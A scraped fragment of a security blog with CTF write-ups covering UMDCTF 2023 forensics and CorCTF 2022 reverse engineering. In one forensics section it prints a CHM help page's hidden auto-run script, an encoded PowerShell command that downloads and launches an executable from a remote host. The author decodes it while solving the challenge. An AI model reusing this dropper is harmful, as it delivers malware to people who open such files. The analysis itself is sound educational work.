‚îî‚îÄ$ steghide extract -sf hide-n-seek.jpg Enter passphrase: wrote extracted data to \u0026#34;kecleon.jpg\u0026#34;. and password 2: timetofindwhatkecleonishiding (In the description of the challenge\u0026hellip;)\n1 2 3 4 ‚îå‚îÄ‚îÄ(kali„âøSpid3r)-[~/Downloads] ‚îî‚îÄ$ steghide extract -sf kecleon.jpg Enter passphrase: wrote extracted data to \u0026#34;flag.txt\u0026#34;. UMDCTF{KECLE0NNNNN}\nFire Type Pokemon Only In this challenge, we receive a pcapng file. Use Wireshark to read the data.\nI have checked both strings and filtered the captured data, but I haven\u0026rsquo;t found anything other than the files retrieved from FTP.\nBased on the header of the secret file, we can determine that it is a zip file (the remaining files also have the correct format).\nAnd this zip file requires us to enter a password\u0026hellip; to extract a file named wisdom.mp4.\nUpon searching for \u0026lsquo;pass\u0026rsquo; in that pcapng file, we found the actual password for this file..\nYARA Trainer Gym This is quite an interesting challenge that I had the opportunity to explore :))). The challenge provides us with a website to test: https://yara-trainer-gym.chall.lol\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 import \u0026#34;elf\u0026#34; import \u0026#34;math\u0026#34; rule rule1 { condition: uint32(0) == 0x464c457f } rule rule2 { strings: $rocket1 = \u0026#34;jessie\u0026#34; $rocket2 = \u0026#34;james\u0026#34; $rocket3 = \u0026#34;meowth\u0026#34; condition: all of ($rocket*) } rule rule3 { meta: description = \u0026#34;Number of sections in a binary\u0026#34; condition: elf.number_of_sections == 40 } rule rule4 { strings: $hex1 = {73 6f 6d 65 74 68 69 6e 67 73 6f 6d 65 74 68 69 6e 67 6d 61 6c 77 61 72 65} $hex2 = {5445414d524f434b4554} $hex3 = {696d20736f207469726564} $hex4 = {736c656570792074696d65} condition: ($hex1 and $hex2) or ($hex3 and $hex4) } rule rule5 { condition: math.entropy(0, filesize) \u0026gt;= 6 } rule rule6 { strings: $xor = \u0026#34;aqvkpjmdofazwf{lqjm1310\u0026lt;\u0026#34; xor condition: $xor } rule rule7 { condition: for any section in elf.sections : (section.name == \u0026#34;poophaha\u0026#34;) } rule rule8 { condition: filesize \u0026lt; 2MB and filesize \u0026gt; 1MB } Basically, here we have to create a file and upload it to the website (satisfying all 8 rules) in order to obtain the flag.\nI approached it by dividing the file into two separate smaller files (each file satisfying a specific set of rules) to avoid complexity during creation.\nThe first file will satisfy rules 1-4 and 6-7. The second file will satisfy rules 5 and 8 (since generating entropy and file size simultaneously with creating the attributes mentioned above can be a bit challenging).\nFirst file first rule:\nuint32(0) == 0x464c457f\nThis checks whether the first 32 bits (offset 0) have the value 0x464c457f (indicating whether the file is in the ELF format or not)\nTo achieve this, it\u0026rsquo;s quite simple. Just add the value 7f 45 4c 46 corresponding to ELF to the file header.\nsecond rule:\n1 2 3 4 5 6 7 strings: $rocket1 = \u0026#34;jessie\u0026#34; $rocket2 = \u0026#34;james\u0026#34; $rocket3 = \u0026#34;meowth\u0026#34; condition: all of ($rocket*) Rule 2 requires the file to contain the strings: jessie, james, and meowth.\n\u0026ndash;\u0026gt; Convert them to hexadecimal and insert them into the file: 6a 65 73 73 69 65 6a 61 6d 65 73 6d 65 6f 77 74 68\nthird rule:\n1 2 3 4 meta: description = \u0026#34;Number of sections in a binary\u0026#34; condition: elf.number_of_sections == 40 This rule checks if the number of sections in the file is exactly 40. I decided to create a file from C to have multiple initial sections.\n1 2 3 4 5 ‚îå‚îÄ‚îÄ(root„âøSpid3r-msi)-[/home/spid3r] ‚îî‚îÄ# echo \u0026#34;int main(){return 0;}\u0026#34; \u0026gt; main.c ‚îå‚îÄ‚îÄ(root„âøSpid3r-msi)-[/home/spid3r] ‚îî‚îÄ# gcc -o main main.c Check the number of sections in the newly created main file using the command:\n1 2 ‚îå‚îÄ‚îÄ(root„âøSpid3r-msi)-[/home/spid3r] ‚îî‚îÄ# objdump -h main Then add the sections to the main file using the command (each time adding one section, continuously repeating until the main file has 40 sections).\n1 2 ‚îå‚îÄ‚îÄ(root„âøSpid3r-msi)-[/home/spid3r] ‚îî‚îÄ# objcopy --add-section .mysection=data.txt main fourth rule\n1 2 3 4 5 6 7 8 strings: $hex1 = {73 6f 6d 65 74 68 69 6e 67 73 6f 6d 65 74 68 69 6e 67 6d 61 6c 77 61 72 65} $hex2 = {5445414d524f434b4554} $hex3 = {696d20736f207469726564} $hex4 = {736c656570792074696d65} condition: ($hex1 and $hex2) or ($hex3 and $hex4) We can choose either hex1 and hex2 or hex3 and hex4 as pairs to insert into the file.\nsixth rule\n1 2 3 4 strings: $xor = \u0026#34;aqvkpjmdofazwf{lqjm1310\u0026lt;\u0026#34; xor condition: $xor Add the string aqvkpjmdofazwf{lqjm1310\u0026lt; to complete the process: 61 71 76 6b 70 6a 6d 64 6f 66 61 7a 77 66 7b 6c 71 6a 6d 31 33 31 30 3c.\nseventh rule\n1 2 condition: for any section in elf.sections : (section.name == \u0026#34;poophaha\u0026#34;) We need a section named poophaha (Please note that with the 40 sections created earlier, one of them should be named poophaha)\n1 2 ‚îå‚îÄ‚îÄ(root„âøSpid3r-msi)-[/home/spid3r] ‚îî‚îÄ# objcopy --add-section .poophaha=data.txt main Second file For the remaining part, since rules 5 and 8 go together, I will create a new file and then merge the two files together.\n1 2 3 4 5 6 7 8 9 rule rule5 { condition: math.entropy(0, filesize) \u0026gt;= 6 } rule rule8 { condition: filesize \u0026lt; 2MB and filesize \u0026gt; 1MB } Rule 5 requires the entropy of the file to be greater than or equal to 6, while Rule 8 specifies that the file size must be greater than 1MB and less than 2MB.\nAfter creating the first file, its entropy is quite low (less than 1 dot), so I need to create a new file with a higher entropy to compensate.\nTo achieve an entropy of greater than or equal to 6 (which is quite challenging with files generated from my processes as they often contain repeated bytes), I will create a new file\n1 2 ‚îå‚îÄ‚îÄ(root„âøSpid3r-msi)-[/home/spid3r] ‚îî‚îÄ# openssl rand -out random.bin 2000000 2000000 here represents the size of the file after creation. I chose this number to comply with Rule 8, and the entropy of the file random.bin generated is very high :)\nNext, I will combine these two files together. To make it easier with a large number of bytes, I will use CyberChef.\nhex of file v√† file after creation\nUMDCTF{Y0ur3_4_r34l_y4r4_m4573r!}\nAlso, in this challenge it is possible to increase entropy using a zip file. The algorithm it uses is suitable for pushing up the entropy level, which corresponds to a higher degree of randomness between bytes. Telekinetic Warfare In this challenge, we obtained a GIF file where each frame of the GIF represents a QR code. I wrote a script to separate the QR codes and decode them simultaneously.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 import os import glob from PIL import Image from pyzbar.pyzbar import decode # Replace \u0026#39;path/to/folder\u0026#39; with the actual path to the folder containing the QR codes folder_path = \u0026#39;qrcodes/\u0026#39; output_file = \u0026#39;qr_codes.txt\u0026#39; # Create a list of all the image files in the folder image_files = glob.glob(os.path.join(folder_path, \u0026#39;*.jpg\u0026#39;)) # Open the output file for writing with open(output_file, \u0026#39;w\u0026#39;) as f: # Loop over each image file in the folder for image_file in image_files: # Open the image and decode the QR code image = Image.open(image_file) qr_code = decode(image) # If a QR code was detected, write the URL to the output file if qr_code: url = qr_code[0].data.decode() f.write(url + \u0026#39;\\n\u0026#39;) After running the script, we obtained a bunch of base64 strings, which were then converted into a PDF file. You can view the decoded flag in the decode flag.\nUMDCTF{wh0_n33d5_k1net1c_w4rfar3_anyw4ys}\nDoctors hate him!! Based on the Malware Chall Disclaimer challenge, we can infer that this challenge is related to malware (perhaps reverse malware?). little timmy and i spent the whole night reversing the file that we suspected to be malicious, and the ending was truly unforgettable.\nIn this challenge, I received a chm file. According to my research, it is a Compiled HTML Help file. I tried opening it with Microsoft Help, but didn\u0026rsquo;t find much\u0026hellip; (except for a button that didn\u0026rsquo;t do anything).\nBased on this button, I think it might have originally been a web page\u0026hellip;\nI used the HelpSmith tool and obtained the following zip file.\nYes, it does contain a real web page\u0026hellip; now it\u0026rsquo;s more accurate.\nIn the source code of the web page, there is a base64-encoded string: VU1EQ1RGezE5OTdfY2FsbGVkXw==.\n\u0026ndash;\u0026gt; UMDCTF{1997_called_\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 \u0026lt;PARAM name=\u0026#34;Item1\u0026#34; value=\u0026#39;,cmd.exe,/c powershell.exe -ExecutionPolicy Bypass -NoLogo -NoProfile -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgAGgAdAB0AHAAOgAvAC8AZABuAHMALQBzAGUAcgB2AGUAcgAuAG8AbgBsAGkAbgBlADoANgA5ADYAOQAvAGUAeABwAGwAbwByAGUALgBlAHgAZQAgAC0ATwB1AHQARgBpAGwAZQAgAGUAeABwAGwAbwByAGUALgBlAHgAZQA7ACAAUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAGUAeABwAGwAbwByAGUALgBlAHgAZQA7ACAAPQAnAGcAdQByAGwAXwBqAG4AYQBnAF8AZwB1AHIAdgBlACcA\u0026#39;\u0026gt; \u0026lt;body\u0026gt; \u0026lt;!--VU1EQ1RGezE5OTdfY2FsbGVkXw==--\u0026gt; \u0026lt;OBJECT id=shortcut classid=\u0026#34;clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11\u0026#34; width=1 height=1\u0026gt; \u0026lt;PARAM name=\u0026#34;Command\u0026#34; value=\u0026#34;ShortCut\u0026#34;\u0026gt; \u0026lt;PARAM name=\u0026#34;Button\u0026#34; value=\u0026#34;Bitmap::shortcut\u0026#34;\u0026gt; \u0026lt;PARAM name=\u0026#34;Item1\u0026#34; value=\u0026#39;,cmd.exe,/c powershell.exe -ExecutionPolicy Bypass -NoLogo -NoProfile -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgAGgAdAB0AHAAOgAvAC8AZABuAHMALQBzAGUAcgB2AGUAcgAuAG8AbgBsAGkAbgBlADoANgA5ADYAOQAvAGUAeABwAGwAbwByAGUALgBlAHgAZQAgAC0ATwB1AHQARgBpAGwAZQAgAGUAeABwAGwAbwByAGUALgBlAHgAZQA7ACAAUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAGUAeABwAGwAbwByAGUALgBlAHgAZQA7ACAAPQAnAGcAdQByAGwAXwBqAG4AYQBnAF8AZwB1AHIAdgBlACcA\u0026#39;\u0026gt; \u0026lt;PARAM name=\u0026#34;Item2\u0026#34; value=\u0026#34;273,1,1\u0026#34;\u0026gt; \u0026lt;/OBJECT\u0026gt; \u0026lt;SCRIPT\u0026gt; shortcut.Click(); \u0026lt;/SCRIPT\u0026gt; \u0026lt;div class=\u0026#34;container\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;text\u0026#34;\u0026gt; \u0026lt;strong\u0026gt; \u0026lt;h1\u0026gt;DOCTORS HATE HIM!!\u0026lt;/h1\u0026gt; \u0026lt;/strong\u0026gt; \u0026lt;p\u0026gt;Do you suffer from low energy, fatigue, and a general lack of motivation? Did your Pokemon leave you for a better trainer? Rocket Corp\u0026#39;s Master Ball Serum can help! Our all-natural formula boosts your energy levels and helps you feel like a young trainer ready to take on the world again!\u0026lt;/p\u0026gt;\u0026lt;button\u0026gt;Find out more!\u0026lt;/button\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;image\u0026#34;\u0026gt; \u0026lt;img src=\u0026#34;depressed_pokemon_trainer.png\u0026#34; alt=\u0026#34;Pikachu\u0026#34;\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; $env:WEB_REQUEST -Uri http://dns-server:6969/explorer.exe -OutFile explorer.exe; Start-Process explorer.exe and\n1 powershell.exe -ExecutionPolicy Bypass -NoLogo -NoProfile -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgAGgAdAB0AHAAOgAvAC8AZABuAHMALQBzAGUAcgB2AGUAcgAuAG8AbgBsAGkAbgBlADoANgA5ADYAOQAvAGUAeABwAGwAbwByAGUALgBlAHgAZQAgAC0ATwB1AHQARgBpAGwAZQAgAGUAeABwAGwAbwByAGUALgBlAHgAZQA7AA== Decoding the above base64 string yields Invoke-WebRequest -Uri http://dns-server.online:6969/explore.exe -OutFile explore.exe;\nAfterwards, I found another segment.\n1 SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgAGgAdAB0AHAAOgAvAC8AZABuAHMALQBzAGUAcgB2AGUAcgAuAG8AbgBsAGkAbgBlADoANgA5ADYAOQAvAGUAeABwAGwAbwByAGUALgBlAHgAZQAgAC0ATwB1AHQARgBpAGwAZQAgAGUAeABwAGwAbwByAGUALgBlAHgAZQA7ACAAUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAGUAeABwAGwAbwByAGUALgBlAHgAZQA7ACAAPQAnAGcAdQByAGwAXwBqAG4AYQBnAF8AZwB1AHIAdgBlACcA Decode base64: Invoke-WebRequest -Uri http://dns-server.online:6969/explore.exe -OutFile explore.exe; Start-Process explore.exe; ='gurl_jnag_gurve'\ngurl_jnag_gurve looks quite similar to a flag :)), I used ChatGPT and found out it\u0026rsquo;s ROT13 encoded :))), guessing until death!!!\n\u0026ndash;\u0026gt; they_want_their\nHere comes the one wrong step, one mile astray moment. From those code snippets and the mentioned command, I only interpreted the PowerShell command executing explore.exe in connection with the challenge name Malware Chall Disclaimer. As a result, I misunderstood that I had to dive into researching that malware to trace it down :)), wasting two hours trying to trace and reverse-engineer that explore.exe while also attempting to decipher it before reaching the solution.\nI should have checked the website itself to see if there was anything significant.\nThank goodness! If I hadn\u0026rsquo;t discovered this by accident before the competition was over, I might have given up on forensics altogether.\nUMDCTF{1997_called_they_want_their_malware_back_bozo}\nConclusion In this competition, I think the forensics challenges were not too difficult overall (even the newbie-level could be accessed by around 7 out of 8 tasks). However, some tasks were overly reliant on guessing, which made it a bit frustrating for forensic enthusiasts.\nThanks to Hwi#9932 for helping me identify some misconceptions in the Telekinetic Warfare challenge and to everyone in BKSEC for constantly encouraging me to improve my skills in forensic challenges digital.\n","date":"2023-05-17T00:00:00Z","image":"/p/umdctf-2023-digital-forensics/featured_hu521915a03207d3ded912c6c781e96e24_122168_120x120_fill_box_smart1_3.png","permalink":"/p/umdctf-2023-digital-forensics/","title":"UMDCTF 2023 | Digital Forensics"},{"content":"Microsoft ‚ù§Ô∏è Linux Microsoft‚Äôs latest addition to the world of Open Source: a flag checker‚Ä¶\nPart 1 analysis Check file \u0026ndash;\u0026gt; elf\ncheck the start function:\nSo easy to see in the loc_100063 stream along with the LINUX system commands, the conclusion is that that the input will be scanned 18 times (1 element each time) then stored in byte_100111, then rol with 0Dh (left shift 13 bits) and compaerd to byte_100210 (in the local)\nCheck byte_100210 (local):\n1 2 3 4 5 6 7 8 9 10 11 00100210 byte_100210 db 6Ch ; DATA XREF: start+1D‚Üër 00100211 dd offset byte_8E6C4EED 00100215 align 2 00100216 dd offset byte_4CAD666F 0010021A dd offset word_666C864E 0010021E dd offset byte_8E0F6685 00100222 dd offset word_2169633E 00100226 dd offset word_3C79553E 0010022A dd offset byte_3C786A63 0010022E dd offset dword_2C2C6538 00100232 dw 703Ch We can byte_100210: b'l\\xedNl\\x8e\\xccof\\xadLN\\x86lf\\x85f\\x0f\\x8e\u0026gt;ci!\u0026gt;Uy\u0026lt;cjx\u0026lt;8e,,\u0026lt;p'\nNow just write a scipt to find the original flag :333 (reverse the encoding of byte_100210 from the original flag):\nScript part 1 1 2 3 4 5 6 7 8 9 10 from pwn import ror input_data = b\u0026#39;l\\xedNl\\x8e\\xccof\\xadLN\\x86lf\\x85f\\x0f\\x8e\u0026gt;ci!\u0026gt;Uy\u0026lt;cjx\u0026lt;8e,,\u0026lt;p\u0026#39; shifted_data = bytearray() for byte in input_data: shifted_byte = ror(byte, 13, 8) shifted_data.append(shifted_byte) print(shifted_data.decode(\u0026#39;latin-1\u0026#39;)) And what we get is \u0026hellip;\ncorctf{3mbr4c3,3xt√±\\x1bK √±¬™√ã√°\\x1bS√É√°√Å+aa√°\nIt seems like i can only get the first half of the flag, which isn\u0026rsquo;t easy by i can input it hix \u0026hellip;\nPart 2 analysis i will carefully check IDA again \u0026amp; see that between function start \u0026amp; byte_100111 along with byte_100210\n1 2 3 4 5 6 7 8 9 001000C2 dd offset dword_168D0AB4 001000C6 dd offset byte_6C60211 001000CA dd offset byte_C6FF0211 001000CE dw 1206h 001000D0 dd offset word_21CDFF02 001000D4 dd 0FE83F631h, 8A117412h, 34021384h, 229C8A0Dh, 75D83803h 001000D4 dd 0EAEB4609h, 33406C7h, 0DB310001h, 3E8309B4h, 74010334h 001000D4 dd 9F168D0Ah, 0B421CD03h, 8D21CD4Ch, 0CD033616h, 0CD4CB421h 00100110 db 21h Switching to reading the code, we get the following\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 001000C2 mov ah, 0Ah 001000C4 lea edx, [esi] 001000C6 adc [edx], eax 001000C8 mov byte ptr [esi], 11h 001000CB add bh, bh 001000CD mov byte ptr [esi], 12h 001000D0 add bh, bh 001000D2 int 21h ; DOS - BUFFERED KEYBOARD INPUT 001000D2 ; DS:DX -\u0026gt; buffer 001000D4 xor esi, esi 001000D6 001000D6 loc_1000D6: ; CODE XREF: 001000EA‚Üìj 001000D6 cmp esi, 12h 001000D9 jz short loc_1000EC 001000DB mov al, [ebx+edx-75F2CBFEh] 001000E2 pushf 001000E3 and al, [ebx] 001000E5 cmp al, bl 001000E7 jnz short loc_1000F2 001000E9 inc esi 001000EA jmp short loc_1000D6 001000EC ; --------------------------------------------------------------------------- 001000EC 001000EC loc_1000EC: ; CODE XREF: 001000D9‚Üëj 001000EC mov dword ptr [esi], 10334h 001000F2 001000F2 loc_1000F2: ; CODE XREF: 001000E7‚Üëj 001000F2 xor ebx, ebx 001000F4 mov ah, 9 001000F6 cmp dword ptr [esi], 34h ; \u0026#39;4\u0026#39; 001000F9 add eax, [ecx] 001000FB jz short near ptr loc_100102+5 001000FD lea edx, [esi] 001000FF lahf 00100100 add ecx, ebp 00100102 00100102 loc_100102: ; CODE XREF: 001000FB‚Üëj 00100102 and [esp+ecx*2+168D21CDh], esi 00100109 db 36h 00100109 add ecx, ebp Combined with assigning 0xd to edx, perhaps this half of the flag will do something with 0xd\nMaybe i though too much (just xor with 0xd)\nflag: corctf{3mbr4c3,3xt3nd,3Xt1ngu15h!!1}\nturbocrab Description: üöÄüöÄ blazinglyer faster üöÄüöÄ SHA256 hash of the flag: dc136f8bf4ba6cc1b3d2f35708a0b2b55cb32c2deb03bdab1e45fcd1102ae00a\nCheck the file Setup and run file:\nWhen i load turbocrab into IDA64\nLooking at this decompiled rust, I came up with the idea of ‚Äã‚Äãsearching the string from the previous check flag section to find the function ü§°\nfunction turbocrab::execute_shellcode::h6984ce5848b31780:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 void __cdecl turbocrab::execute_shellcode::h6984ce5848b31780(__u8_ shellcode) { __u8_ v1; // rdi __int64 v2; // r15 __int64 v3; // rdx usize v4; // [rsp+8h] [rbp-190h] u8 *v5; // [rsp+10h] [rbp-188h] usize len; // [rsp+20h] [rbp-178h] __int64 count; // [rsp+28h] [rbp-170h] core::ffi::c_void *src; // [rsp+30h] [rbp-168h] core::ffi::c_void *dst; // [rsp+48h] [rbp-150h] _BYTE v10[29]; // [rsp+63h] [rbp-135h] BYREF alloc::vec::Vec\u0026lt;u8,alloc::alloc::Global\u0026gt; self; // [rsp+80h] [rbp-118h] BYREF u8 *v12; // [rsp+98h] [rbp-100h] __int64 v13; // [rsp+A0h] [rbp-F8h] BYREF core::fmt::Arguments v14; // [rsp+A8h] [rbp-F0h] BYREF core::fmt::Arguments v15; // [rsp+D8h] [rbp-C0h] BYREF __u8_ v16; // [rsp+108h] [rbp-90h] core::ffi::c_void *v17; // [rsp+118h] [rbp-80h] __int64 *v18; // [rsp+130h] [rbp-68h] __int64 v19; // [rsp+138h] [rbp-60h] __int64 v20; // [rsp+140h] [rbp-58h] __int64 v21; // [rsp+148h] [rbp-50h] core::ffi::c_void *v22; // [rsp+150h] [rbp-48h] core::ffi::c_void *v23; // [rsp+158h] [rbp-40h] __int64 v24; // [rsp+160h] [rbp-38h] __int64 v25; // [rsp+168h] [rbp-30h] u8 *v26; // [rsp+170h] [rbp-28h] __int64 v27; // [rsp+178h] [rbp-20h] u8 *v28; // [rsp+180h] [rbp-18h] v16 = shellcode; v25 = 0LL; dst = mmap(0LL, shellcode.length, 3, 33, -1, 0LL); v17 = dst; qmemcpy(v10, \u0026#34;R^CRIWJM\u0026lt;6.[5I.G`.C3G3CB5_V?P\u0026#34;, sizeof(v10)); alloc::vec::from_elem::hba0d51ad3cb1207d(\u0026amp;self, 0, 0x4000uLL); v26 = alloc::vec::Vec$LT$T$C$A$GT$::as_ptr::h0252951c7d91d004(\u0026amp;self); v27 = 49602LL; v28 = v26 + 49602; v12 = v26 + 49602; src = core::slice::_$LT$impl$u20$$u5b$T$u5d$$GT$::as_ptr::h869fdf96852d8c48(shellcode); count = core::slice::_$LT$impl$u20$$u5b$T$u5d$$GT$::len::h00af0a2d7a9c0658(shellcode); v22 = dst; v23 = src; v24 = count; core::intrinsics::copy::h46e3e522e297e890(src, dst, count); len = core::slice::_$LT$impl$u20$$u5b$T$u5d$$GT$::len::h00af0a2d7a9c0658(shellcode); mprotect(dst, len, 5); v13 = v20; v18 = \u0026amp;v13; v1.data_ptr = v10; v1.length = 29LL; v5 = core::slice::_$LT$impl$u20$$u5b$T$u5d$$GT$::as_ptr::h869fdf96852d8c48(v1); v1.data_ptr = v10; v1.length = 29LL; v4 = core::slice::_$LT$impl$u20$$u5b$T$u5d$$GT$::len::h00af0a2d7a9c0658(v1); v2 = v12; v13 = (dst)(v10, 29LL, v3, dst, v5, v4); v12 = v2; v19 = v13; v21 = v13; if ( v13 == 1 ) core::fmt::Arguments::new_v1::h610d7aa66ccb1a0c(\u0026amp;v14, __PAIR128__(1LL, \u0026amp;stru_5620902FFF78), \u0026amp;stru_562090296240); else core::fmt::Arguments::new_v1::h610d7aa66ccb1a0c(\u0026amp;v15, __PAIR128__(1LL, \u0026amp;stru_5620902FFF68), \u0026amp;stru_562090296240); std::io::stdio::_print::hccc6c4adfff98fee(); core::ptr::drop_in_place$LT$alloc..vec..Vec$LT$u8$GT$$GT$::h34608ea8b4b90afb(\u0026amp;self); } My conclusion here is:\nR^CRIWJM\u0026lt;6.[5I.G`.C3G3CB5_V?P looks like it\u0026rsquo;s been encrypted\nshellcode and source dst are unknown v13 == 1 --\u0026gt; Correct! and vice versa\nDebugging Setup virtual machine for debugging with breakpoint set at v13 = (dst)(v10, 29LL, v3, dst, v5, v4);\nStep into continuously and when it comes to call close ptr unk_7F8C04CC62B2 there is a section LINUX-sys_read \u0026ndash;\u0026gt; Interrupt for input, we will see the section after that will have the input you entered and also the local encoding flag\nContinue and understand that the flow of the program is xor with 13 then sub with 1Eh (each character) like the asm fragment below:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 zero:00007FE17840D120 loc_7FE17840D120: ; CODE XREF: zero:00007FE17840D06F‚Üëj zero:00007FE17840D120 mov rax, r9 zero:00007FE17840D123 xor rax, r9 zero:00007FE17840D126 mov r9, rax zero:00007FE17840D129 mov al, [r8] zero:00007FE17840D12C mov r9b, al zero:00007FE17840D12F mov al, r9b zero:00007FE17840D132 xor al, 13h zero:00007FE17840D134 mov r9b, al zero:00007FE17840D137 pushfq zero:00007FE17840D138 mov al, r9b zero:00007FE17840D13B mov rbx, rax zero:00007FE17840D13E mov al, 80h zero:00007FE17840D140 mov rcx, 2 zero:00007FE17840D14A cmp rbx, rax zero:00007FE17840D14D jz short loc_7FE17840D158 zero:00007FE17840D14F sbb rcx, rcx zero:00007FE17840D152 and ecx, 0FFFFFFFDh zero:00007FE17840D155 add ecx, 4 zero:00007FE17840D158 zero:00007FE17840D158 loc_7FE17840D158: ; CODE XREF: zero:00007FE17840D14D‚Üëj zero:00007FE17840D158 mov r14, rcx zero:00007FE17840D15B popfq zero:00007FE17840D15C mov rax, r14 zero:00007FE17840D15F and al, 4 zero:00007FE17840D161 test al, al zero:00007FE17840D163 jz short loc_7FE17840D16D zero:00007FE17840D165 mov al, r9b zero:00007FE17840D168 xor al, 37h zero:00007FE17840D16A mov r9b, al zero:00007FE17840D16D zero:00007FE17840D16D loc_7FE17840D16D: ; CODE XREF: zero:00007FE17840D163‚Üëj zero:00007FE17840D16D mov al, r9b zero:00007FE17840D170 sub al, 1Eh zero:00007FE17840D172 mov r9b, al zero:00007FE17840D175 pushfq zero:00007FE17840D176 mov al, r9b zero:00007FE17840D179 mov rbx, rax zero:00007FE17840D17C mov al, 10h zero:00007FE17840D17E mov rcx, 2 zero:00007FE17840D188 cmp rbx, rax zero:00007FE17840D18B jz short loc_7FE17840D196 zero:00007FE17840D18D sbb rcx, rcx zero:00007FE17840D190 and ecx, 0FFFFFFFDh zero:00007FE17840D193 add ecx, 4 zero:00007FE17840D196 zero:00007FE17840D196 loc_7FE17840D196: ; CODE XREF: zero:00007FE17840D18B‚Üëj zero:00007FE17840D196 mov r14, rcx zero:00007FE17840D199 popfq zero:00007FE17840D19A mov rax, r14 zero:00007FE17840D19D and al, 3 zero:00007FE17840D19F test al, al zero:00007FE17840D1A1 jz short loc_7FE17840D1AB zero:00007FE17840D1A3 mov al, r9b zero:00007FE17840D1A6 xor al, 31h zero:00007FE17840D1A8 mov r9b, al zero:00007FE17840D1AB zero:00007FE17840D1AB loc_7FE17840D1AB: ; CODE XREF: zero:00007FE17840D1A1‚Üëj zero:00007FE17840D1AB mov al, r9b zero:00007FE17840D1AE mov [r8], al zero:00007FE17840D1B1 mov rax, [r15] zero:00007FE17840D1B4 add r15, 8 zero:00007FE17840D1B8 jmp rax Solve Script 1 2 3 encrypt = b\u0026#34;R^CRIWJM\u0026lt;6.[5I.G`.C3G3CB5_V?P\u0026#34; for i in encrypt: print(chr((i + 0x1e) ^ 0x13), end = \u0026#34;\u0026#34;) \u0026ndash;\u0026gt; corctf{xIG_j@t_vm_rBvBrs@ngN}\nIt seems that the flag still has no meaning, but now I notice the sha256 part in the Description: dc136f8bf4ba6cc1b3d2f35708a0b2b55cb32c2deb03bdab1e45fcd1102ae00a\nI can only think of one direction: bruteforce until the two sha256 codes are the same, then initial flag with some identifiable characteristics to save time such as: B can be 3, e or E and @ can be 1, i, I or !.\nBased on those, we can write a script to get the flag:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 import hashlib target_hash = \u0026#34;dc136f8bf4ba6cc1b3d2f35708a0b2b55cb32c2deb03bdab1e45fcd1102ae00a\u0026#34; characters = \u0026#34;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ,.!?;:\u0026#39;-()[]{}\u0026lt;\u0026gt;\\/@#$%^\u0026amp;*_+=\u0026#34; guess1 = [\u0026#34;1\u0026#34;, \u0026#34;i\u0026#34;, \u0026#34;I\u0026#34;, \u0026#34;!\u0026#34;] guess2 = [\u0026#34;3\u0026#34;, \u0026#34;e\u0026#34;, \u0026#34;E\u0026#34;] for i in range(len(characters)): for j in range(len(characters)): for k in range(len(guess1)): for l in range(len(guess2)): for m in range(len(characters)): candidate = f\u0026#34;corctf{{x{characters[i]}{characters[j]}_j{guess1[k]}t_vm_r{guess2[l]}v{guess2[l]}rs{guess1[k]}ng{characters[m]}}}\u0026#34; hashed = hashlib.sha256(candidate.encode(\u0026#39;utf-8\u0026#39;)).hexdigest() if hashed == target_hash: print(\u0026#34;Found:\u0026#34;, candidate) break flag:corctf{x86_j1t_vm_r3v3rs1ng?}\n","date":"2022-08-09T00:00:00Z","image":"/p/corctf-2022-reverse-engineering/featured-image_huc527355a429b7d0660ac9e16fd98331c_24593_120x120_fill_box_smart1_3.png","permalink":"/p/corctf-2022-reverse-engineering/","title":"CorCTF 2022 | Reverse Engineering"},{"content":"MISC Discord check Flag ƒë∆∞·ª£c ghim ·ªü Annoucements\nflag: WhiteHat{Ready_for_WhiteHatPlay11_Ready_for_a_vibrant_summer}\nAudio ·ªû b√†i n√†y ch√∫ng ta s·∫Ω nh·∫≠n ƒë∆∞·ª£c 1 file wav (file √¢m thanh). Ta ti·∫øn h√†nh m·ªü file b·∫±ng Audacity\nChuy·ªÉn qua xem d∆∞·ªõi d·∫°ng ·∫£nh ph·ªï ta ƒë∆∞·ª£c:\nS·ª≠ d·ª•ng c√†i ƒë·∫∑t ·∫£nh ph·ªï v√† ƒëi·ªÅu ch·ªânh th√¥ng s·ªë sao cho ph√π h·ª£p, ho·∫∑c lƒÉn chu·ªôt ƒë·ªÉ ph·ªï gi√£n ƒë·ªÅu:\n-‚Äì\u0026gt; 3u1b_51_n0dn01 (·ªü ƒë√¢y v·∫´n ch·∫≥ng c√≥ nghƒ©a g√¨)\nXem l·∫°i hint c·ªßa ƒë·ªÅ 